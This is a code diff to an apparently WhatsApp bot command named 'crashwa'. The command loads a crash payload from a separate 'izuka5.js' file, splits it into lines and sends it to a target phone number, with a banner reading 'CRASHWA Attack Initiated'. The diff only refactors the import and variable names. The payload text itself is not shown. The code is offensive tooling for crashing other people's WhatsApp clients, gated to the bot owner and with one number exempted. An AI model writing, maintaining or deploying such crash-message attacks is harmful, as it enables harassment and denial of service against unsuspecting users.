@@ -1,6 +1,6 @@
 const { cmd } = require('../command');
 const config = require('../config');
-const bugchat = require('../../bug/izuka5.js'); // Use izuka5.js as requested
+const { izuka5 } = require('../../bug/izuka5.js');  // Nou itilize named export
 
 cmd({
   pattern: 'crashwa',
@@ -13,11 +13,17 @@ cmd({
     const prefix = config.PREFIX;
     const botNumber = await bot.decodeJid(bot.user.id);
     const senderId = m.sender;
-    const allowedUsers = [botNumber, config.OWNER_NUMBER + '@s.whatsapp.net', ...(config.SUDO || []).map(n => n + '@s.whatsapp.net')];
+    const allowedUsers = [
+      botNumber,
+      config.OWNER_NUMBER + '@s.whatsapp.net',
+      ...(config.SUDO || []).map(n => n + '@s.whatsapp.net')
+    ];
     const protectedNumbers = ['13058962443'];
 
     const body = m.body || '';
-    const cmdName = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase() : '';
+    const cmdName = body.startsWith(prefix)
+      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
+      : '';
     if (cmdName !== 'crashwa') return;
 
     if (!allowedUsers.includes(senderId)) {
@@ -40,7 +46,7 @@ cmd({
     }
 
     const targetJid = `${targetNumber}@s.whatsapp.net`;
-    const crashLines = crashPayload.split('\n').filter(Boolean);
+    const crashLines = izuka5.split('\n').filter(Boolean);
 
     await bot.sendMessage(from, {
       text: `💣 *CRASHWA Attack Initiated*\n📱 Target: +${targetNumber}\n📦 Payload: ${crashLines.length} lines\n\n⚠️ Wait while the attack is sent...`
